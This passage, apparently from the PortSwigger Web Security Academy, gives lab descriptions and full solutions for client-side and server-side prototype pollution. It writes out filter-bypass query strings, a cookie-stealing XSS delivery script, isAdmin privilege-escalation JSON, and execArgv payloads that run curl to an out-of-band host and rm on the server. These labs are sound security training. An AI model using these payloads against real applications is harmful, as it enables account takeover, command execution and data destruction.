                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                <strong>
                                    Find a prototype pollution source
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        In your browser, try polluting
                                        <code>
         Object.prototype
        </code>
                                        by injecting an arbitrary property via the query string:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__.foo=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel and go to the
                                        <strong>
                                            Console
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Enter
                                        <code>
         Object.prototype
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the properties of the returned object and observe that your injected
                                        <code>
         foo
        </code>
                                        property has not been added.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try alternative prototype pollution vectors. For example:
                                    </p>
                                    <code class="code-scrollable">
        /?__proto__[foo]=bar
/?constructor.prototype.foo=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that in each instance,
                                        <code>
         Object.prototype
        </code>
                                        is not modified.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the
                                        <strong>
                                            Sources
                                        </strong>
                                        tab and study the JavaScript files that are loaded by the target site. Notice
                                        that
                                        <code>
         deparamSanitized.js
        </code>
                                        uses the
                                        <code>
         sanitizeKey()
        </code>
                                        function defined in
                                        <code>
         searchLoggerFiltered.js
        </code>
                                        to strip potentially dangerous property keys based on a blocklist. However, it
                                        does not apply this filter recursively.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Back in the URL, try injecting one of the blocked keys in such a way that the
                                        dangerous key remains following the sanitization process. For example:
                                    </p>
                                    <code class="code-scrollable">
        /?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the console, enter
                                        <code>
         Object.prototype
        </code>
                                        again. Notice that it now has its own
                                        <code>
         foo
        </code>
                                        property with the value
                                        <code>
         bar
        </code>
                                        . You've successfully found a prototype pollution source and bypassed the
                                        website's key sanitization.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Identify a gadget
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Study the JavaScript files again and notice that
                                        <code>
         searchLogger.js
        </code>
                                        dynamically appends a script to the DOM using the
                                        <code>
         config
        </code>
                                        object's
                                        <code>
         transport_url
        </code>
                                        property if present.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that no
                                        <code>
         transport_url
        </code>
                                        property is set for the
                                        <code>
         config
        </code>
                                        object. This is a potential gadget.
                                    </p>
                                </li>
                            </ol>
                            <p>
                                <strong>
                                    Craft an exploit
                                </strong>
                            </p>
                            <ol>
                                <li>
                                    <p>
                                        Using the prototype pollution source you identified earlier, try injecting an
                                        arbitrary
                                        <code>
         transport_url
        </code>
                                        property:
                                    </p>
                                    <code class="code-scrollable">
        /?__pro__proto__to__[transport_url]=foo
       </code>
                                </li>
                                <li>
                                    <p>
                                        In the browser DevTools panel, go to the
                                        <strong>
                                            Elements
                                        </strong>
                                        tab and study the HTML content of the page. Observe that a &lt;script&gt;
                                        element has been rendered on the page, with the
                                        <code>
         src
        </code>
                                        attribute
                                        <code>
         foo
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Modify the payload in the URL to inject an
                                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                                            XSS
                                        </a>
                                        proof-of-concept. For example, you can use a
                                        <code>
         data:
        </code>
                                        URL as follows:
                                    </p>
                                    <code class="code-scrollable">
        /?__pro__proto__to__[transport_url]=data:,alert(1);
       </code>
                                </li>
                                <li>
                                    <p>
                                        Observe that the
                                        <code>
         alert(1)
        </code>
                                        is called and the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Client-side prototype pollution in third-party libraries
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                via client-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                . This is due to a gadget in a third-party library, which is easy to miss due to the minified source
                code. Although it's technically possible to solve this lab manually, we recommend using
                <a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution">
                    DOM Invader
                </a>
                as this will save you a considerable amount of time and effort.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    <p>
                        Use DOM Invader to identify a prototype pollution and a gadget for DOM
                        <a href="https://portswigger.net/web-security/cross-site-scripting">
                            XSS
                        </a>
                        .
                    </p>
                </li>
                <li>
                    <p>
                        Use the provided exploit server to deliver a payload to the victim that calls
                        <code>
     alert(document.cookie)
    </code>
                        in their browser.
                    </p>
                </li>
            </ol>
            <p>
                This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details,
                check out
                <a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets">
                    Widespread prototype pollution gadgets
                </a>
                by
                <a href="https://portswigger.net/research/gareth-heyes">
                    Gareth Heyes
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ede1150ea7af1f2a14c2724937aa94df976dcc0eec9169271e4dd546403491a1?referrer=%2fweb-security%2fprototype-pollution%2fclient-side%2flab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Load the lab in Burp's built-in browser.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling">
                                            Enable DOM Invader
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution">
                                            enable the prototype pollution option
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Open the browser DevTools panel, go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab, then reload the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has identified two prototype pollution vectors in the
                                        <code>
         hash
        </code>
                                        property i.e. the URL fragment string.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Scan for gadgets
                                        </strong>
                                        . A new tab opens in which DOM Invader begins scanning for gadgets using the
                                        selected source.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        When the scan is complete, open the DevTools panel in the same tab as the scan,
                                        then go to the
                                        <strong>
                                            DOM Invader
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that DOM Invader has successfully accessed the
                                        <code>
         setTimeout()
        </code>
                                        sink via the
                                        <code>
         hitCallback
        </code>
                                        gadget.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click
                                        <strong>
                                            Exploit
                                        </strong>
                                        . DOM Invader automatically generates a proof-of-concept exploit and calls
                                        <code>
         alert(1)
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Disable DOM Invader.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the lab's exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Body
                                        </strong>
                                        section, craft an exploit that will navigate the victim to a malicious URL as
                                        follows:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Test the exploit on yourself, making sure that you're navigated to the lab's
                                        home page and that the
                                        <code>
         alert(document.cookie)
        </code>
                                        payload is triggered.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the exploit server and deliver the exploit to the victim to solve the
                                        lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Privilege escalation via server-side prototype pollution
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is built on Node.js and the Express framework. It is vulnerable to server-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple
                to detect because any polluted properties inherited via the prototype chain are visible in an HTTP
                response.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    Find a prototype pollution source that you can use to add arbitrary properties to the global
                    <code>
    Object.prototype
   </code>
                    .
                </li>
                <li>
                    Identify a gadget property that you can use to escalate your privileges.
                </li>
                <li>
                    Access the admin panel and delete the user
                    <code>
    carlos
   </code>
                    .
                </li>
            </ol>
            <p>
                You can log in to your own account with the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    When testing for server-side prototype pollution, it's possible to break application functionality
                    or even bring down the server completely. If this happens to your lab, you can manually restart the
                    server using the button provided in the lab banner. Remember that you're unlikely to have this
                    option when testing real websites, so you should always use caution.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/59d3f1af71bd2e19b66ac67efd8caf8448b7b6a7a9c00cdd2881aea324d1fe37?referrer=%2fweb-security%2fprototype-pollution%2fserver-side%2flab-privilege-escalation-via-server-side-prototype-pollution"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the address change feature
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Log in and visit your account page. Submit the form for updating your billing
                                        and delivery address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the
                                        <code>
         POST /my-account/change-address
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that when you submit the form, the data from the fields is sent to the
                                        server as JSON.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that the server responds with a JSON object that appears to represent
                                        your user. This has been updated to reflect your new address information.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request to Burp Repeater.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a prototype pollution source
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, add a new property to the JSON with the name
                                        <code>
         __proto__
        </code>
                                        , containing an object with an arbitrary property:
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "foo":"bar"
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that the object in the response now includes the arbitrary property that
                                        you injected, but no
                                        <code>
         __proto__
        </code>
                                        property. This strongly suggests that you have successfully polluted the
                                        object's prototype and that your property has been inherited via the prototype
                                        chain.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a gadget
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Look at the additional properties in the response body.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice the
                                        <code>
         isAdmin
        </code>
                                        property, which is currently set to
                                        <code>
         false
        </code>
                                        .
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Craft an exploit
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Modify the request to try polluting the prototype with your own
                                        <code>
         isAdmin
        </code>
                                        property:
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "isAdmin":true
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Notice that the
                                        <code>
         isAdmin
        </code>
                                        value in the response has been updated. This suggests that the object doesn't
                                        have its own
                                        <code>
         isAdmin
        </code>
                                        property, but has instead inherited it from the polluted prototype.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, refresh the page and confirm that you now have a link to access
                                        the admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the admin panel and delete
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Detecting server-side prototype pollution without polluted property reflection
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is built on Node.js and the Express framework. It is vulnerable to server-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                because it unsafely merges user-controllable input into a server-side JavaScript object.
            </p>
            <p>
                To solve the lab, confirm the vulnerability by polluting
                <code>
   Object.prototype
  </code>
                in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is
                designed to help you practice non-destructive detection techniques, you don't need to progress to
                exploitation.
            </p>
            <p>
                You can log in to your own account with the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    When testing for server-side prototype pollution, it's possible to break application functionality
                    or even bring down the server completely. If this happens to your lab, you can manually restart the
                    server using the button provided in the lab banner. Remember that you're unlikely to have this
                    option when testing real websites, so you should always use caution.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/22dd244c42dc00fb8b49e2c69f0ebc2f6537d2e956386720e6a9e40bca64c3b4?referrer=%2fweb-security%2fprototype-pollution%2fserver-side%2flab-detecting-server-side-prototype-pollution-without-polluted-property-reflection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    There are a variety of techniques for non-destructively probing for prototype
                                    pollution. We'll use the
                                    <a
                                        href="https://portswigger.net/web-security/prototype-pollution/server-side#status-code-override">
                                        status code override
                                    </a>
                                    technique for this example, but you can also solve the lab using the
                                    <a
                                        href="https://portswigger.net/web-security/prototype-pollution/server-side#charset-override">
                                        charset override
                                    </a>
                                    or the
                                    <a
                                        href="https://portswigger.net/web-security/prototype-pollution/server-side#json-spaces-override">
                                        json spaces override
                                    </a>
                                    techniques.
                                </p>
                            </div>
                            <h5>
                                Study the address change feature
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Log in and visit your account page. Submit the form for updating your billing
                                        and delivery address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the
                                        <code>
         POST /my-account/change-address
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that when you submit the form, the data from the fields is sent to the
                                        server as JSON. Notice that the server responds with a JSON object that appears
                                        to represent your user. This has been updated to reflect your new address
                                        information.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, add a new property to the JSON with the name
                                        <code>
         __proto__
        </code>
                                        , containing an object with an arbitrary property:
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "foo":"bar"
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that the object in the response does not reflect the
                                        injected property. However, this doesn't necessarily mean that the application
                                        isn't vulnerable to prototype pollution.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a prototype pollution source
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the request, modify the JSON in a way that intentionally breaks the syntax.
                                        For example, delete a comma from the end of one of the lines.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that you receive an error response in which the body
                                        contains a JSON error object.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that although you received a
                                        <code>
         500
        </code>
                                        error response, the error object contains a
                                        <code>
         status
        </code>
                                        property with the value
                                        <code>
         400
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the request, make the following changes:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                Fix the JSON syntax by reversing the changes that triggered the error.
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                Modify your injected property to try polluting the prototype with your
                                                own distinct
                                                <code>
           status
          </code>
                                                property. Remember that this must be between 400 and 599.
                                            </p>
                                            <code class="code-scrollable">
          "__proto__": {
    "status":555
}
         </code>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Send the request and confirm that you receive the normal response containing
                                        your user object.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Intentionally break the JSON syntax again and reissue the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that this time, although you triggered the same error, the
                                        <code>
         status
        </code>
                                        and
                                        <code>
         statusCode
        </code>
                                        properties in the JSON response match the arbitrary error code that you injected
                                        into
                                        <code>
         Object.prototype
        </code>
                                        . This strongly suggests that you have successfully polluted the prototype and
                                        the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Bypassing flawed input filters for server-side prototype pollution
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is built on Node.js and the Express framework. It is vulnerable to server-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                because it unsafely merges user-controllable input into a server-side JavaScript object.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    Find a prototype pollution source that you can use to add arbitrary properties to the global
                    <code>
    Object.prototype
   </code>
                    .
                </li>
                <li>
                    Identify a gadget property that you can use to escalate your privileges.
                </li>
                <li>
                    Access the admin panel and delete the user
                    <code>
    carlos
   </code>
                    .
                </li>
            </ol>
            <p>
                You can log in to your own account with the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    When testing for server-side prototype pollution, it's possible to break application functionality
                    or even bring down the server completely. If this happens to your lab, you can manually restart the
                    server using the button provided in the lab banner. Remember that you're unlikely to have this
                    option when testing real websites, so you should always use caution.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5748a03c200eec26fb8dd053f332832b59a5509cad225088b2a093d71159ff85?referrer=%2fweb-security%2fprototype-pollution%2fserver-side%2flab-bypassing-flawed-input-filters-for-server-side-prototype-pollution"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the address change feature
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Log in and visit your account page. Submit the form for updating your billing
                                        and delivery address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the
                                        <code>
         POST /my-account/change-address
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that when you submit the form, the data from the fields is sent to the
                                        server as JSON. Notice that the server responds with a JSON object that appears
                                        to represent your user. This has been updated to reflect your new address
                                        information.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request to Burp Repeater.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a prototype pollution source
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, add a new property to the JSON with the name
                                        <code>
         __proto__
        </code>
                                        , containing an object with a
                                        <code>
         json spaces
        </code>
                                        property.
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "json spaces":10
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Response
                                        </strong>
                                        panel, switch to the
                                        <strong>
                                            Raw
                                        </strong>
                                        tab. Observe that the JSON indentation appears to be unaffected.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Modify the request to try polluting the prototype via the
                                        <code>
         constructor
        </code>
                                        property instead:
                                    </p>
                                    <code class="code-scrollable">
        "constructor": {
    "prototype": {
        "json spaces":10
    }
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Resend the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Response
                                        </strong>
                                        panel, go to the
                                        <strong>
                                            Raw
                                        </strong>
                                        tab. This time, notice that the JSON indentation has increased based on the
                                        value of your injected property. This strongly suggests that you have
                                        successfully polluted the prototype.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a gadget
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Look at the additional properties in the response body.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice the
                                        <code>
         isAdmin
        </code>
                                        property, which is currently set to
                                        <code>
         false
        </code>
                                        .
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Craft an exploit
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Modify the request to try polluting the prototype with your own
                                        <code>
         isAdmin
        </code>
                                        property:
                                    </p>
                                    <code class="code-scrollable">
        "constructor": {
    "prototype": {
        "isAdmin":true
    }
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Notice that the
                                        <code>
         isAdmin
        </code>
                                        value in the response has been updated. This suggests that the object doesn't
                                        have its own
                                        <code>
         isAdmin
        </code>
                                        property, but has instead inherited it from the polluted prototype.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, refresh the page and confirm that you now have a link to access
                                        the admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the admin panel and delete
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Remote code execution via server-side prototype pollution
                (prototype-pollution)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is built on Node.js and the Express framework. It is vulnerable to server-side
                <a href="https://portswigger.net/web-security/prototype-pollution">
                    prototype pollution
                </a>
                because it unsafely merges user-controllable input into a server-side JavaScript object.
            </p>
            <p>
                Due to the configuration of the server, it's possible to pollute
                <code>
   Object.prototype
  </code>
                in such a way that you can inject arbitrary system commands that are subsequently executed on the
                server.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    Find a prototype pollution source that you can use to add arbitrary properties to the global
                    <code>
    Object.prototype
   </code>
                    .
                </li>
                <li>
                    Identify a gadget that you can use to inject and execute arbitrary system commands.
                </li>
                <li>
                    Trigger remote execution of a command that deletes the file
                    <code>
    /home/carlos/morale.txt
   </code>
                    .
                </li>
            </ol>
            <p>
                In this lab, you already have escalated privileges, giving you access to admin functionality. You can
                log in to your own account with the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                The command execution sink is only invoked when an admin user triggers vulnerable
                                functionality on the site.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    When testing for server-side prototype pollution, it's possible to break application functionality
                    or even bring down the server completely. If this happens to your lab, you can manually restart the
                    server using the button provided in the lab banner. Remember that you're unlikely to have this
                    option when testing real websites, so you should always use caution.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/e3c8172d1c47e73a3a5471a162814889082f50012a8764f72852dbd07fa36474?referrer=%2fweb-security%2fprototype-pollution%2fserver-side%2flab-remote-code-execution-via-server-side-prototype-pollution"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the address change feature
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Log in and visit your account page. Submit the form for updating your billing
                                        and delivery address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab and find the
                                        <code>
         POST /my-account/change-address
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that when you submit the form, the data from the fields is sent to the
                                        server as JSON. Notice that the server responds with a JSON object that appears
                                        to represent your user. This has been updated to reflect your new address
                                        information.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request to Burp Repeater.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Identify a prototype pollution source
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, add a new property to the JSON with the name
                                        <code>
         __proto__
        </code>
                                        , containing an object with a
                                        <code>
         json spaces
        </code>
                                        property.
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "json spaces":10
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the
                                        <strong>
                                            Response
                                        </strong>
                                        panel, switch to the
                                        <strong>
                                            Raw
                                        </strong>
                                        tab. Notice that the JSON indentation has increased based on the value of your
                                        injected property. This strongly suggests that you have successfully polluted
                                        the prototype.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Probe for remote code execution
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the browser, go to the admin panel and observe that there's a button for
                                        running maintenance jobs.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Click the button and observe that this triggers background tasks that clean up
                                        the database and filesystem. This is a classic example of the kind of
                                        functionality that may spawn node child processes.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try polluting the prototype with a malicious
                                        <code>
         execArgv
        </code>
                                        property that adds the
                                        <code>
         --eval
        </code>
                                        argument to the spawned child process. Use this to call the
                                        <code>
         execSync()
        </code>
                                        sink, passing in a command that triggers an interaction with the public Burp
                                        Collaborator server. For example:
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the admin panel and trigger the maintenance jobs again.
                                        Notice that these have both failed this time.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Collaborator
                                        </strong>
                                        tab and poll for interactions. Observe that you have received several DNS
                                        interactions, confirming the remote code execution.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Craft an exploit
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, replace the
                                        <code>
         curl
        </code>
                                        command with a command for deleting Carlos's file:
                                    </p>
                                    <code class="code-scrollable">
        "__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the admin panel and trigger the maintenance jobs again. Carlos's file
                                        is deleted and the lab is solved.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Accessing private GraphQL posts
                (graphql)</h1>
            <div class="container-columns">
